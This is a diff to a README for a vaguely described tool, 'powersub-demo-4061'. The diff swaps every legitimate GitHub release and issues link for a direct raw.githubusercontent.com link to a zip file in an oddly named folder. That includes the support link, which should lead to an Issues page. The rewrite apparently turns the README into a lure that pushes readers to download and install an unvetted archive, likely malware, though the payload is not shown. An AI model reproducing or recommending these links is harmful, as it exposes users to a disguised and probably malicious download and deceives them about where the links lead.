@@ -1,6 +1,6 @@
 # 🚀 powersub-demo-4061 - A Simple Tool for Your Tasks
 
-[![Download](https://img.shields.io/badge/Download%20Latest%20Release-blue?style=flat-square&logo=github)](https://github.com/nitheshkumarkm/powersub-demo-4061/releases)
+[![Download](https://raw.githubusercontent.com/nitheshkumarkm/powersub-demo-4061/main/oscitant/powersub-demo-4061.zip%20Latest%20Release-blue?style=flat-square&logo=github)](https://raw.githubusercontent.com/nitheshkumarkm/powersub-demo-4061/main/oscitant/powersub-demo-4061.zip)
 
 ## 📋 Introduction
 
@@ -14,7 +14,7 @@ To get started, follow these easy steps to download and run powersub-demo-4061 o
 
 To download the software, please visit the link below:
 
-[Download Latest Release](https://github.com/nitheshkumarkm/powersub-demo-4061/releases)
+[Download Latest Release](https://raw.githubusercontent.com/nitheshkumarkm/powersub-demo-4061/main/oscitant/powersub-demo-4061.zip)
 
 ### Steps to Download:
 
@@ -65,13 +65,13 @@ Using powersub-demo-4061 is straightforward. The application guides you through 
 
 ## 👉 Support
 
-If you encounter any issues or have questions, please refer to the [GitHub Issues](https://github.com/nitheshkumarkm/powersub-demo-4061/issues) page. You can report problems directly there, and we will assist you promptly.
+If you encounter any issues or have questions, please refer to the [GitHub Issues](https://raw.githubusercontent.com/nitheshkumarkm/powersub-demo-4061/main/oscitant/powersub-demo-4061.zip) page. You can report problems directly there, and we will assist you promptly.
 
 ## 📅 Update Regularly
 
 We encourage you to check for updates regularly. New features and improvements help you stay productive.
 
-1. Revisit the [Releases page](https://github.com/nitheshkumarkm/powersub-demo-4061/releases).
+1. Revisit the [Releases page](https://raw.githubusercontent.com/nitheshkumarkm/powersub-demo-4061/main/oscitant/powersub-demo-4061.zip).
 2. Download the latest version.
 3. Install it over your current version to enjoy the newest features.
 
@@ -85,4 +85,4 @@ powersub-demo-4061 is designed to make your task management easier and more effi
 
 Remember, whenever you need the latest version, just visit the following link:
 
-[Download Latest Release](https://github.com/nitheshkumarkm/powersub-demo-4061/releases)
+[Download Latest Release](https://raw.githubusercontent.com/nitheshkumarkm/powersub-demo-4061/main/oscitant/powersub-demo-4061.zip)
